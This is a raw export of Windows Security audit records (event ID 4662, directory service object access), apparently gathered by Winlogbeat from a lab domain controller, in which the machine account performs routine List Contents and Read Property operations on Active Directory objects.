			{2ab0e48d-ac4e-4afc-83e5-a34240db6198}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110126	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.169"	"jRDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.989"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{e11505d7-92c4-43e7-bf5c-295832ffc896}
	Object Name:		%{23ecd0f5-43f2-42a5-b52a-0f95549723c6}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{e11505d7-92c4-43e7-bf5c-295832ffc896}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{23ecd0f5-43f2-42a5-b52a-0f95549723c6}"	DS	"%{e11505d7-92c4-43e7-bf5c-295832ffc896}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{e11505d7-92c4-43e7-bf5c-295832ffc896}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110125	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.169"	"jBDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.989"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{67212414-7bcc-4609-87e0-088dad8abdee}
	Object Name:		%{86fd1a02-26cc-4653-85f6-37709e8229a2}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{67212414-7bcc-4609-87e0-088dad8abdee}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{86fd1a02-26cc-4653-85f6-37709e8229a2}"	DS	"%{67212414-7bcc-4609-87e0-088dad8abdee}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{67212414-7bcc-4609-87e0-088dad8abdee}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110124	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.168"	"ixDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.989"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{e11505d7-92c4-43e7-bf5c-295832ffc896}
	Object Name:		%{23ecd0f5-43f2-42a5-b52a-0f95549723c6}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{261337aa-f1c3-44b2-bbea-c88d49e6f0c7}
	{e11505d7-92c4-43e7-bf5c-295832ffc896}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{23ecd0f5-43f2-42a5-b52a-0f95549723c6}"	DS	"%{e11505d7-92c4-43e7-bf5c-295832ffc896}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{261337aa-f1c3-44b2-bbea-c88d49e6f0c7}
	{e11505d7-92c4-43e7-bf5c-295832ffc896}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110119	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.168"	"ihDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.989"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{fa85c591-197f-477e-83bd-ea5a43df2239}
	Object Name:		%{b706fd49-0590-405c-b23f-08c74bdfc87a}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{fa85c591-197f-477e-83bd-ea5a43df2239}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{b706fd49-0590-405c-b23f-08c74bdfc87a}"	DS	"%{fa85c591-197f-477e-83bd-ea5a43df2239}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{fa85c591-197f-477e-83bd-ea5a43df2239}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110118	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.168"	"iRDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.989"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{e11505d7-92c4-43e7-bf5c-295832ffc896}
	Object Name:		%{23ecd0f5-43f2-42a5-b52a-0f95549723c6}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{e11505d7-92c4-43e7-bf5c-295832ffc896}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{23ecd0f5-43f2-42a5-b52a-0f95549723c6}"	DS	"%{e11505d7-92c4-43e7-bf5c-295832ffc896}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{e11505d7-92c4-43e7-bf5c-295832ffc896}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110117	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.168"	"iBDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.989"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{fa85c591-197f-477e-83bd-ea5a43df2239}
	Object Name:		%{b706fd49-0590-405c-b23f-08c74bdfc87a}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
	{fa85c591-197f-477e-83bd-ea5a43df2239}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{1a861408-38c3-49ea-ba75-85481a77c655}
			{fe515695-3f61-45c8-9bfa-19c148c57b09}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{b706fd49-0590-405c-b23f-08c74bdfc87a}"	DS	"%{fa85c591-197f-477e-83bd-ea5a43df2239}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
	{fa85c591-197f-477e-83bd-ea5a43df2239}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{1a861408-38c3-49ea-ba75-85481a77c655}
			{fe515695-3f61-45c8-9bfa-19c148c57b09}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110112	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.168"	"hxDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.989"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967a86-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967a86-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110111	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.168"	"hhDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.989"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{fa85c591-197f-477e-83bd-ea5a43df2239}
	Object Name:		%{b706fd49-0590-405c-b23f-08c74bdfc87a}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{fa85c591-197f-477e-83bd-ea5a43df2239}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{b706fd49-0590-405c-b23f-08c74bdfc87a}"	DS	"%{fa85c591-197f-477e-83bd-ea5a43df2239}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{fa85c591-197f-477e-83bd-ea5a43df2239}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110110	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.167"	"hRDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.989"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
	{bf967a86-0de6-11d0-a285-00aa003049e2}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{26d9736d-6070-11d1-a9c6-0000f80367c1}
			{26d9736e-6070-11d1-a9c6-0000f80367c1}
		{72e39547-7b18-11d1-adef-00c04fd8d5cd}
			{72e39547-7b18-11d1-adef-00c04fd8d5cd}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
	{bf967a86-0de6-11d0-a285-00aa003049e2}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{26d9736d-6070-11d1-a9c6-0000f80367c1}
			{26d9736e-6070-11d1-a9c6-0000f80367c1}
		{72e39547-7b18-11d1-adef-00c04fd8d5cd}
			{72e39547-7b18-11d1-adef-00c04fd8d5cd}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110105	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.167"	"hBDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.989"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{bf967aa5-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{36761a13-1d02-46ee-b2d7-084a40b1f759}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967aa5-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{36761a13-1d02-46ee-b2d7-084a40b1f759}"	DS	"%{bf967aa5-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967aa5-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110104	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.167"	"gxDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.989"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{bf967a86-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{bf967a86-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110103	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.166"	"ghDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.989"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
	{bf967a86-0de6-11d0-a285-00aa003049e2}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
			{f3a64788-5306-11d1-a9c5-0000f80367c1}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{26d9736d-6070-11d1-a9c6-0000f80367c1}
			{26d9736e-6070-11d1-a9c6-0000f80367c1}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
		{72e39547-7b18-11d1-adef-00c04fd8d5cd}
			{72e39547-7b18-11d1-adef-00c04fd8d5cd}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
	{bf967a86-0de6-11d0-a285-00aa003049e2}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
